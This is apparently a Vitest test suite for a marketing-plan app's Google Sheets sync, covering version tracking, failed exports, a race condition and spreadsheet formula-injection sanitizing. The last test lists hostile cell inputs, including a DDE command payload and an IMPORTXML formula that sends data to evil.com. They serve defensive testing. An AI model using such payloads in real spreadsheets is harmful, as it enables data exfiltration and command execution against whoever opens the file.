import { describe, it, expect, beforeAll, afterAll, vi } from "vitest";
import request from "supertest";
import app from "../src/app.js";
import { signTestToken } from "../src/utils/jwt.js";
import { supabaseAdmin } from "../src/config/supabase.js";
import { googleSheetsService } from "../src/services/integrations/google-sheets.service.js";
import { plansRepository } from "../src/repositories/plans.repository.js";
import { exportsRepository } from "../src/repositories/exports.repository.js";
import { sanitizeForGoogleSheets } from "../src/services/integrations/sheets-sanitizer.js";

describe("Google Sheets Synchronization Test Suite (MADAR V2.1.5 Bugfix)", () => {
  const testUserId = "sync-test-user-" + Date.now();
  let authToken;
  let testPlanId;
  let day1ItemId;
  let day2ItemId;

  async function waitForExportStatus(planId, userId, expectedVersion) {
    for (let i = 0; i < 60; i++) {
      await (googleSheetsService._syncQueues?.get(planId) || Promise.resolve()).catch(() => {});
      const exportRecord = await exportsRepository.getExportByPlanId(planId, userId);
      if (
        exportRecord &&
        (exportRecord.exported_version === expectedVersion || exportRecord.status === "failed")
      ) {
        return exportRecord;
      }
      await new Promise((r) => setTimeout(r, 100));
    }
    return exportsRepository.getExportByPlanId(planId, userId);
  }

  beforeAll(async () => {
    authToken = await signTestToken({
      id: testUserId,
      email: `${testUserId}@example.com`,
      name: "Sync Test User",
    });

    await supabaseAdmin.from("profiles").upsert({
      auth_user_id: testUserId,
      email: `${testUserId}@example.com`,
      name: "Sync Test User",
    });

    // Create a completed plan
    const plan = await plansRepository.createPlan(testUserId, {
      product_name: "Sync Test Product",
      product_description: "Testing Google Sheets sync after mutation",
      product_category: "برمجيات / SaaS",
      target_audience: "Marketers",
      problem_solved: "Sync reliability",
      marketing_objective: "direct_sales",
      brand_tone: ["احترافي ورسمي"],
      status: "completed",
    });
    testPlanId = plan.id;

    // Set initial content_version = 1
    await supabaseAdmin
      .from("marketing_plans")
      .update({ content_version: 1 })
      .eq("id", testPlanId);

    // Insert 30 content items
    const items = Array.from({ length: 30 }, (_, i) => ({
      marketing_plan_id: testPlanId,
      user_id: testUserId,
      day_number: i + 1,
      caption: `Original caption for day ${i + 1}`,
      design_copy: { headline: `Original headline ${i + 1}` },
      post_type: "reel",
      content_objective: "awareness",
      content_pillar: "الأساس",
      design_reference: "مرجع بصري",
      cta: "دعوة تجريبية",
      revision: 1,
    }));
    const { data: insertedItems } = await supabaseAdmin.from("content_items").insert(items).select();
    day1ItemId = insertedItems.find((i) => i.day_number === 1).id;
    day2ItemId = insertedItems.find((i) => i.day_number === 2).id;

    // Create initial completed export record at version 1
    await exportsRepository.createExport(testPlanId, testUserId);
    await exportsRepository.updateExportStatus(testPlanId, "completed", {
      spreadsheetId: "mock-sync-sheet-123",
      spreadsheetUrl: "https://docs.google.com/spreadsheets/d/mock-sync-sheet-123",
      targetVersion: 1,
      exportedVersion: 1,
    });
  });

  afterAll(async () => {
    vi.restoreAllMocks();
    if (testPlanId) {
      await plansRepository.deletePlan(testPlanId, testUserId);
    }
    await supabaseAdmin.from("profiles").delete().eq("auth_user_id", testUserId);
  });

  // TEST 1 — Single mutation
  it("Test 1 — Single mutation: DB succeeds → content_version increments → Sheet sync runs → exported_version = content_version → status = completed", async () => {
    let capturedExportParams = null;
    vi.spyOn(googleSheetsService, "exportPlanToSheets").mockImplementation(async (params) => {
      capturedExportParams = params;
      return {
        success: true,
        status: "completed",
        isShared: true,
        spreadsheetId: params.existingSpreadsheetId || "mock-sync-sheet-123",
        spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${params.existingSpreadsheetId || "mock-sync-sheet-123"}`,
      };
    });

    const newCaption = "Mutated Caption for Day 1 — Single Mutation Test";

    // Call single day mutation endpoint
    const res = await request(app)
      .patch(`/api/v1/plans/${testPlanId}/content/1`)
      .set("Authorization", `Bearer ${authToken}`)
      .send({
        expectedRevision: 1,
        expectedPlanVersion: 1,
        editSource: "manual",
        changes: {
          caption: newCaption,
        },
      });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.newPlanVersion).toBe(2);

    // Wait for background sync to complete
    const exportRecord = await waitForExportStatus(testPlanId, testUserId, 2);

    // Verify Google Sheets export was called with existing spreadsheet ID
    expect(capturedExportParams).not.toBeNull();
    expect(capturedExportParams.existingSpreadsheetId).toBe("mock-sync-sheet-123");

    // Verify DB export record state
    expect(exportRecord.status).toBe("completed");
    expect(exportRecord.target_version).toBe(2);
    expect(exportRecord.exported_version).toBe(2);
    expect(exportRecord.error_message).toBeNull();
  });

  // TEST 2 — Batch mutation
  it("Test 2 — Batch mutation: Batch succeeds → content_version increments once → Sheet reflects changed items → exported_version = content_version → status = completed", async () => {
    let capturedExportItems = null;
    vi.spyOn(googleSheetsService, "exportPlanToSheets").mockImplementation(async (params) => {
      capturedExportItems = params.contentItems;
      return {
        success: true,
        status: "completed",
        isShared: true,
        spreadsheetId: "mock-sync-sheet-123",
        spreadsheetUrl: "https://docs.google.com/spreadsheets/d/mock-sync-sheet-123",
      };
    });

    // Plan is now at version 2, day 1 is at revision 2, day 2 is at revision 1
    const res = await request(app)
      .post(`/api/v1/plans/${testPlanId}/content/batch`)
      .set("Authorization", `Bearer ${authToken}`)
      .send({
        expectedPlanVersion: 2,
        editSource: "external_ai",
        batch: [
          {
            day_number: 1,
            expected_revision: 2,
            changes: { caption: "Batch Updated Caption Day 1" },
          },
          {
            day_number: 2,
            expected_revision: 1,
            changes: { caption: "Batch Updated Caption Day 2" },
          },
        ],
      });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.newPlanVersion).toBe(3);

    // Wait for background sync
    const exportRecord = await waitForExportStatus(testPlanId, testUserId, 3);

    // Verify DB export record
    expect(exportRecord.status).toBe("completed");
    expect(exportRecord.target_version).toBe(3);
    expect(exportRecord.exported_version).toBe(3);

    // Verify that captured items reflect all changed content
    expect(capturedExportItems).not.toBeNull();
    const exportedDay1 = capturedExportItems.find((i) => i.day_number === 1);
    const exportedDay2 = capturedExportItems.find((i) => i.day_number === 2);
    expect(exportedDay1.caption).toBe("Batch Updated Caption Day 1");
    expect(exportedDay2.caption).toBe("Batch Updated Caption Day 2");
  });

  // TEST 3 — Failed export
  it("Test 3 — Failed export: DB mutation succeeds → export fails → DB remains authoritative → export status is failed → exported_version is NOT advanced", async () => {
    vi.spyOn(googleSheetsService, "exportPlanToSheets").mockResolvedValueOnce({
      success: false,
      status: "failed",
      isShared: false,
      errorMessage: "Google Sheets API Rate Limit Exceeded (429)",
    });

    // Mutate day 1 from revision 3, plan version 3 -> 4
    const res = await request(app)
      .patch(`/api/v1/plans/${testPlanId}/content/1`)
      .set("Authorization", `Bearer ${authToken}`)
      .send({
        expectedRevision: 3,
        expectedPlanVersion: 3,
        editSource: "manual",
        changes: { caption: "Caption with Failed Sync Simulation" },
      });

    expect(res.status).toBe(200);
    expect(res.body.data.newPlanVersion).toBe(4);

    // Wait for background sync attempt
    const exportRecord = await waitForExportStatus(testPlanId, testUserId, 4);

    // Export failed: DB remains authoritative, status is failed, exported_version is NOT advanced to 4
    expect(exportRecord.status).toBe("failed");
    expect(exportRecord.exported_version).toBe(3); // Still old version 3!
    expect(exportRecord.target_version).toBe(4);
    expect(exportRecord.error_message).toContain("429");
  });

  // TEST 4 — Version race
  it("Test 4 — Version race: Plan mutates while export is running → Old export must NOT be recorded as completed for new version", async () => {
    // Simulate slow export for version 4
    let exportStarted = false;
    vi.spyOn(googleSheetsService, "exportPlanToSheets").mockImplementationOnce(async (params) => {
      exportStarted = true;
      // Delay to allow concurrent mutation to happen in DB
      await new Promise((r) => setTimeout(r, 400));
      return {
        success: true,
        status: "completed",
        isShared: true,
        spreadsheetId: "mock-sync-sheet-123",
        spreadsheetUrl: "https://docs.google.com/spreadsheets/d/mock-sync-sheet-123",
      };
    });

    // Start sync for version 4
    const syncPromise = googleSheetsService.syncPlanToGoogleSheet(testPlanId, 4);

    // Wait until export has started
    for (let i = 0; i < 20 && !exportStarted; i++) {
      await new Promise((r) => setTimeout(r, 20));
    }

    // Now concurrently mutate plan in DB to version 5!
    await supabaseAdmin
      .from("marketing_plans")
      .update({ content_version: 5, updated_at: new Date().toISOString() })
      .eq("id", testPlanId);

    // Await the version 4 sync
    const syncResult = await syncPromise;

    // Verify race detection result:
    expect(syncResult.status).toBe("stale");

    // In DB, exported_version must NOT be recorded as 5!
    const exportRecord = await exportsRepository.getExportByPlanId(testPlanId, testUserId);
    expect(exportRecord.exported_version).not.toBe(5);
    expect(exportRecord.status).toBe("stale");
  });

  // TEST 5 — Formula injection protection
  it("Test 5 — Formula injection: Confirm sanitizer protects all Google Sheets string cells without modifying stored DB content", () => {
    const maliciousInputs = [
      "=SUM(A1:A10)",
      "+123456789",
      "-cmd|' /C calc'!A0",
      "@IMPORTXML(\"https://evil.com/leak\",\"//a\")",
      "Normal text",
      12345,
      null,
      undefined,
    ];

    const sanitized = maliciousInputs.map((input) => sanitizeForGoogleSheets(input));

    // Dangerous triggers must be prefixed with apostrophe
    expect(sanitized[0]).toBe("'=SUM(A1:A10)");
    expect(sanitized[1]).toBe("'+123456789");
    expect(sanitized[2]).toBe("'-cmd|' /C calc'!A0");
    expect(sanitized[3]).toBe("'@IMPORTXML(\"https://evil.com/leak\",\"//a\")");

    // Safe inputs are unchanged
    expect(sanitized[4]).toBe("Normal text");
    expect(sanitized[5]).toBe(12345);
    expect(sanitized[6]).toBe("");
    expect(sanitized[7]).toBe("");
  });
});
